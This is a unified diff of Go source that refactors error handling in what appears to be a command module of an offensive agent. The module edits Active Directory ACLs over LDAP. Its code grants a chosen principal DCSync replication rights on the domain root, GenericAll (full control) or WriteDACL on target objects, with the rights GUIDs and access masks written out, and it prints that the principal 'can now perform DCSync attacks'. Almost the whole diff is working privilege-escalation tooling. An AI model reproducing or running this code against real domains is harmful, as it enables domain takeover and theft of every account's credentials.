@@ -35,36 +35,21 @@ type aclEditArgs struct {
 func (c *AclEditCommand) Execute(task structs.Task) structs.CommandResult {
 	allActions := "read, add, remove, grant-dcsync, grant-genericall, grant-writedacl, backup, restore"
 	if task.Params == "" {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error: parameters required. Use -action <%s> -server <DC> -target <object>", allActions),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error: parameters required. Use -action <%s> -server <DC> -target <object>", allActions)
 	}
 
 	var args aclEditArgs
 	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing parameters: %v", err)
 	}
+	defer structs.ZeroString(&args.Password)
 
 	if args.Server == "" {
-		return structs.CommandResult{
-			Output:    "Error: server parameter required (domain controller IP or hostname)",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: server parameter required (domain controller IP or hostname)")
 	}
 
 	if args.Target == "" && args.Action != "restore" {
-		return structs.CommandResult{
-			Output:    "Error: target parameter required",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: target parameter required")
 	}
 
 	if args.Port <= 0 {
@@ -82,11 +67,7 @@ func (c *AclEditCommand) Execute(task structs.Task) structs.CommandResult {
 		"backup": true, "restore": true,
 	}
 	if !validActions[action] {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: %s", args.Action, allActions),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown action: %s\nAvailable: %s", args.Action, allActions)
 	}
 
 	// Connect
@@ -95,21 +76,13 @@ func (c *AclEditCommand) Execute(task structs.Task) structs.CommandResult {
 		Username: args.Username, Password: args.Password,
 	})
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error connecting to LDAP server %s:%d: %v", args.Server, args.Port, err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error connecting to LDAP server %s:%d: %v", args.Server, args.Port, err)
 	}
 	defer conn.Close()
 
 	// Bind
 	if err := ldapBind(conn, ldapQueryArgs{Username: args.Username, Password: args.Password}); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error binding to LDAP: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error binding to LDAP: %v", err)
 	}
 
 	// Determine base DN
@@ -117,11 +90,7 @@ func (c *AclEditCommand) Execute(task structs.Task) structs.CommandResult {
 	if baseDN == "" {
 		baseDN, err = detectBaseDN(conn)
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error detecting base DN: %v. Specify -base_dn manually.", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error detecting base DN: %v. Specify -base_dn manually.", err)
 		}
 	}
 
@@ -143,7 +112,7 @@ func (c *AclEditCommand) Execute(task structs.Task) structs.CommandResult {
 	case "restore":
 		return aclEditRestore(conn, args, baseDN)
 	default:
-		return structs.CommandResult{Output: "Unknown action", Status: "error", Completed: true}
+		return errorResult("Unknown action")
 	}
 }
 
@@ -205,16 +174,12 @@ func buildSDFlagsControl(flags uint32) *ldap.ControlString {
 func aclEditRead(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.CommandResult {
 	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("Error resolving target '%s': %v", args.Target, err), Status: "error", Completed: true,
-		}
+		return errorf("Error resolving target '%s': %v", args.Target, err)
 	}
 
 	sd, err := aclEditReadSD(conn, targetDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("Error reading security descriptor: %v", err), Status: "error", Completed: true,
-		}
+		return errorf("Error reading security descriptor: %v", err)
 	}
 
 	aces := daclParseSD(sd)
@@ -272,7 +237,7 @@ func aclEditRead(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.Comma
 	}
 
 	data, _ := json.Marshal(out)
-	return structs.CommandResult{Output: string(data), Status: "success", Completed: true}
+	return successResult(string(data))
 }
 
 // resolvePrincipalSID resolves a principal name to a binary SID via LDAP
@@ -436,42 +401,29 @@ func aclEditModifySD(conn *ldap.Conn, targetDN string, principalSID []byte, prin
 // aclEditAdd adds an ACE granting the specified right to the principal
 func aclEditAdd(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.CommandResult {
 	if args.Principal == "" {
-		return structs.CommandResult{
-			Output: "Error: principal parameter required (sAMAccountName or SID)", Status: "error", Completed: true,
-		}
+		return errorResult("Error: principal parameter required (sAMAccountName or SID)")
 	}
 	if args.Right == "" {
-		return structs.CommandResult{
-			Output: "Error: right parameter required (genericall, writedacl, writeowner, forcechangepassword, dcsync, etc.)", Status: "error", Completed: true,
-		}
+		return errorResult("Error: right parameter required (genericall, writedacl, writeowner, forcechangepassword, dcsync, etc.)")
 	}
 
 	mask, objectGUID, aceType := rightToMaskAndGUID(args.Right)
 	if mask == 0 {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("Unknown right: %s\nAvailable: genericall, genericwrite, writedacl, writeowner, allextendedrights, writeproperty, forcechangepassword, dcsync, ds-replication-get-changes-all, write-member, write-spn, write-keycredentiallink", args.Right),
-			Status: "error", Completed: true,
-		}
+		return errorf("Unknown right: %s\nAvailable: genericall, genericwrite, writedacl, writeowner, allextendedrights, writeproperty, forcechangepassword, dcsync, ds-replication-get-changes-all, write-member, write-spn, write-keycredentiallink", args.Right)
 	}
 
 	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("Error resolving target '%s': %v", args.Target, err), Status: "error", Completed: true,
-		}
+		return errorf("Error resolving target '%s': %v", args.Target, err)
 	}
 
 	principalSID, principalSIDStr, err := resolvePrincipalSID(conn, args.Principal, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("Error resolving principal '%s': %v", args.Principal, err), Status: "error", Completed: true,
-		}
+		return errorf("Error resolving principal '%s': %v", args.Principal, err)
 	}
 
 	if err := aclEditModifySD(conn, targetDN, principalSID, principalSIDStr, mask, objectGUID, aceType, false); err != nil {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("Error modifying DACL: %v", err), Status: "error", Completed: true,
-		}
+		return errorf("Error modifying DACL: %v", err)
 	}
 
 	rightDesc := args.Right
@@ -479,67 +431,49 @@ func aclEditAdd(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.Comman
 		rightDesc = fmt.Sprintf("%s (%s)", args.Right, daclGUIDName(objectGUID))
 	}
 
-	return structs.CommandResult{
-		Output: fmt.Sprintf("[*] ACL Modified\n"+
-			"[+] Target: %s\n"+
-			"[+] Principal: %s (%s)\n"+
-			"[+] Right Added: %s\n"+
-			"[+] Server: %s\n", targetDN, args.Principal, principalSIDStr, rightDesc, args.Server),
-		Status: "success", Completed: true,
-	}
+	return successf("[*] ACL Modified\n"+
+		"[+] Target: %s\n"+
+		"[+] Principal: %s (%s)\n"+
+		"[+] Right Added: %s\n"+
+		"[+] Server: %s\n", targetDN, args.Principal, principalSIDStr, rightDesc, args.Server)
 }
 
 // aclEditRemove removes a matching ACE from the DACL
 func aclEditRemove(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.CommandResult {
 	if args.Principal == "" || args.Right == "" {
-		return structs.CommandResult{
-			Output: "Error: principal and right parameters required", Status: "error", Completed: true,
-		}
+		return errorResult("Error: principal and right parameters required")
 	}
 
 	mask, objectGUID, aceType := rightToMaskAndGUID(args.Right)
 	if mask == 0 {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("Unknown right: %s", args.Right), Status: "error", Completed: true,
-		}
+		return errorf("Unknown right: %s", args.Right)
 	}
 
 	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("Error resolving target '%s': %v", args.Target, err), Status: "error", Completed: true,
-		}
+		return errorf("Error resolving target '%s': %v", args.Target, err)
 	}
 
 	principalSID, principalSIDStr, err := resolvePrincipalSID(conn, args.Principal, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("Error resolving principal '%s': %v", args.Principal, err), Status: "error", Completed: true,
-		}
+		return errorf("Error resolving principal '%s': %v", args.Principal, err)
 	}
 
 	if err := aclEditModifySD(conn, targetDN, principalSID, principalSIDStr, mask, objectGUID, aceType, true); err != nil {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("Error modifying DACL: %v", err), Status: "error", Completed: true,
-		}
+		return errorf("Error modifying DACL: %v", err)
 	}
 
-	return structs.CommandResult{
-		Output: fmt.Sprintf("[*] ACL Modified\n"+
-			"[+] Target: %s\n"+
-			"[+] Principal: %s (%s)\n"+
-			"[+] Right Removed: %s\n"+
-			"[+] Server: %s\n", targetDN, args.Principal, principalSIDStr, args.Right, args.Server),
-		Status: "success", Completed: true,
-	}
+	return successf("[*] ACL Modified\n"+
+		"[+] Target: %s\n"+
+		"[+] Principal: %s (%s)\n"+
+		"[+] Right Removed: %s\n"+
+		"[+] Server: %s\n", targetDN, args.Principal, principalSIDStr, args.Right, args.Server)
 }
 
 // aclEditGrantDCSync adds both DS-Replication-Get-Changes and DS-Replication-Get-Changes-All
 func aclEditGrantDCSync(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.CommandResult {
 	if args.Principal == "" {
-		return structs.CommandResult{
-			Output: "Error: principal parameter required", Status: "error", Completed: true,
-		}
+		return errorResult("Error: principal parameter required")
 	}
 
 	// DCSync needs to be applied to the domain root, not an arbitrary object
@@ -547,129 +481,94 @@ func aclEditGrantDCSync(conn *ldap.Conn, args aclEditArgs, baseDN string) struct
 
 	principalSID, principalSIDStr, err := resolvePrincipalSID(conn, args.Principal, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("Error resolving principal '%s': %v", args.Principal, err), Status: "error", Completed: true,
-		}
+		return errorf("Error resolving principal '%s': %v", args.Principal, err)
 	}
 
 	// Add DS-Replication-Get-Changes
 	guid1 := aclGUIDBytes("1131f6aa-9c07-11d1-f79f-00c04fc2dcd2")
 	if err := aclEditModifySD(conn, targetDN, principalSID, principalSIDStr, 0x00000100, guid1, 0x05, false); err != nil {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("Error adding DS-Replication-Get-Changes: %v", err), Status: "error", Completed: true,
-		}
+		return errorf("Error adding DS-Replication-Get-Changes: %v", err)
 	}
 
 	// Add DS-Replication-Get-Changes-All
 	guid2 := aclGUIDBytes("1131f6ad-9c07-11d1-f79f-00c04fc2dcd2")
 	if err := aclEditModifySD(conn, targetDN, principalSID, principalSIDStr, 0x00000100, guid2, 0x05, false); err != nil {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("Error adding DS-Replication-Get-Changes-All: %v", err), Status: "error", Completed: true,
-		}
+		return errorf("Error adding DS-Replication-Get-Changes-All: %v", err)
 	}
 
-	return structs.CommandResult{
-		Output: fmt.Sprintf("[*] DCSync Rights Granted\n"+
-			"[+] Target: %s (domain root)\n"+
-			"[+] Principal: %s (%s)\n"+
-			"[+] Added: DS-Replication-Get-Changes\n"+
-			"[+] Added: DS-Replication-Get-Changes-All\n"+
-			"[+] Server: %s\n"+
-			"[!] The principal can now perform DCSync attacks\n", targetDN, args.Principal, principalSIDStr, args.Server),
-		Status: "success", Completed: true,
-	}
+	return successf("[*] DCSync Rights Granted\n"+
+		"[+] Target: %s (domain root)\n"+
+		"[+] Principal: %s (%s)\n"+
+		"[+] Added: DS-Replication-Get-Changes\n"+
+		"[+] Added: DS-Replication-Get-Changes-All\n"+
+		"[+] Server: %s\n"+
+		"[!] The principal can now perform DCSync attacks\n", targetDN, args.Principal, principalSIDStr, args.Server)
 }
 
 // aclEditGrantGenericAll adds GenericAll to the principal on the target
 func aclEditGrantGenericAll(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.CommandResult {
 	if args.Principal == "" {
-		return structs.CommandResult{
-			Output: "Error: principal parameter required", Status: "error", Completed: true,
-		}
+		return errorResult("Error: principal parameter required")
 	}
 
 	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("Error resolving target '%s': %v", args.Target, err), Status: "error", Completed: true,
-		}
+		return errorf("Error resolving target '%s': %v", args.Target, err)
 	}
 
 	principalSID, principalSIDStr, err := resolvePrincipalSID(conn, args.Principal, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("Error resolving principal '%s': %v", args.Principal, err), Status: "error", Completed: true,
-		}
+		return errorf("Error resolving principal '%s': %v", args.Principal, err)
 	}
 
 	if err := aclEditModifySD(conn, targetDN, principalSID, principalSIDStr, 0x10000000, nil, 0x00, false); err != nil {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("Error adding GenericAll: %v", err), Status: "error", Completed: true,
-		}
+		return errorf("Error adding GenericAll: %v", err)
 	}
 
-	return structs.CommandResult{
-		Output: fmt.Sprintf("[*] GenericAll Granted\n"+
-			"[+] Target: %s\n"+
-			"[+] Principal: %s (%s)\n"+
-			"[+] Right: GenericAll (FULL CONTROL)\n"+
-			"[+] Server: %s\n", targetDN, args.Principal, principalSIDStr, args.Server),
-		Status: "success", Completed: true,
-	}
+	return successf("[*] GenericAll Granted\n"+
+		"[+] Target: %s\n"+
+		"[+] Principal: %s (%s)\n"+
+		"[+] Right: GenericAll (FULL CONTROL)\n"+
+		"[+] Server: %s\n", targetDN, args.Principal, principalSIDStr, args.Server)
 }
 
 // aclEditGrantWriteDACL adds WriteDACL to the principal on the target
 func aclEditGrantWriteDACL(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.CommandResult {
 	if args.Principal == "" {
-		return structs.CommandResult{
-			Output: "Error: principal parameter required", Status: "error", Completed: true,
-		}
+		return errorResult("Error: principal parameter required")
 	}
 
 	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("Error resolving target '%s': %v", args.Target, err), Status: "error", Completed: true,
-		}
+		return errorf("Error resolving target '%s': %v", args.Target, err)
 	}
 
 	principalSID, principalSIDStr, err := resolvePrincipalSID(conn, args.Principal, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("Error resolving principal '%s': %v", args.Principal, err), Status: "error", Completed: true,
-		}
+		return errorf("Error resolving principal '%s': %v", args.Principal, err)
 	}
 
 	if err := aclEditModifySD(conn, targetDN, principalSID, principalSIDStr, 0x00040000, nil, 0x00, false); err != nil {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("Error adding WriteDACL: %v", err), Status: "error", Completed: true,
-		}
+		return errorf("Error adding WriteDACL: %v", err)
 	}
 
-	return structs.CommandResult{
-		Output: fmt.Sprintf("[*] WriteDACL Granted\n"+
-			"[+] Target: %s\n"+
-			"[+] Principal: %s (%s)\n"+
-			"[+] Right: WriteDACL\n"+
-			"[+] Server: %s\n", targetDN, args.Principal, principalSIDStr, args.Server),
-		Status: "success", Completed: true,
-	}
+	return successf("[*] WriteDACL Granted\n"+
+		"[+] Target: %s\n"+
+		"[+] Principal: %s (%s)\n"+
+		"[+] Right: WriteDACL\n"+
+		"[+] Server: %s\n", targetDN, args.Principal, principalSIDStr, args.Server)
 }
 
 // aclEditBackup exports the current DACL as base64 for later restoration
 func aclEditBackup(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.CommandResult {
 	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("Error resolving target '%s': %v", args.Target, err), Status: "error", Completed: true,
-		}
+		return errorf("Error resolving target '%s': %v", args.Target, err)
 	}
 
 	sd, err := aclEditReadSD(conn, targetDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("Error reading security descriptor: %v", err), Status: "error", Completed: true,
-		}
+		return errorf("Error reading security descriptor: %v", err)
 	}
 
 	encoded := base64.StdEncoding.EncodeToString(sd)
@@ -687,35 +586,27 @@ func aclEditBackup(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.Com
 	}
 
 	data, _ := json.Marshal(out)
-	return structs.CommandResult{Output: string(data), Status: "success", Completed: true}
+	return successResult(string(data))
 }
 
 // aclEditRestore writes a previously backed-up DACL back to the object
 func aclEditRestore(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.CommandResult {
 	if args.Backup == "" {
-		return structs.CommandResult{
-			Output: "Error: backup parameter required (base64-encoded security descriptor from backup action)", Status: "error", Completed: true,
-		}
+		return errorResult("Error: backup parameter required (base64-encoded security descriptor from backup action)")
 	}
 
 	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
 	if err != nil {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("Error resolving target '%s': %v", args.Target, err), Status: "error", Completed: true,
-		}
+		return errorf("Error resolving target '%s': %v", args.Target, err)
 	}
 
 	sd, err := base64.StdEncoding.DecodeString(args.Backup)
 	if err != nil {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("Error decoding backup: %v", err), Status: "error", Completed: true,
-		}
+		return errorf("Error decoding backup: %v", err)
 	}
 
 	if len(sd) < 20 {
-		return structs.CommandResult{
-			Output: "Error: invalid security descriptor (too short)", Status: "error", Completed: true,
-		}
+		return errorResult("Error: invalid security descriptor (too short)")
 	}
 
 	// Try with SD_FLAGS control first, fallback to without
@@ -731,16 +622,11 @@ func aclEditRestore(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.Co
 	}
 
 	if err != nil {
-		return structs.CommandResult{
-			Output: fmt.Sprintf("Error restoring DACL: %v", err), Status: "error", Completed: true,
-		}
+		return errorf("Error restoring DACL: %v", err)
 	}
 
-	return structs.CommandResult{
-		Output: fmt.Sprintf("[*] DACL Restored\n"+
-			"[+] Target: %s\n"+
-			"[+] Restored from backup (%d bytes)\n"+
-			"[+] Server: %s\n", targetDN, len(sd), args.Server),
-		Status: "success", Completed: true,
-	}
+	return successf("[*] DACL Restored\n"+
+		"[+] Target: %s\n"+
+		"[+] Restored from backup (%d bytes)\n"+
+		"[+] Server: %s\n", targetDN, len(sd), args.Server)
 }
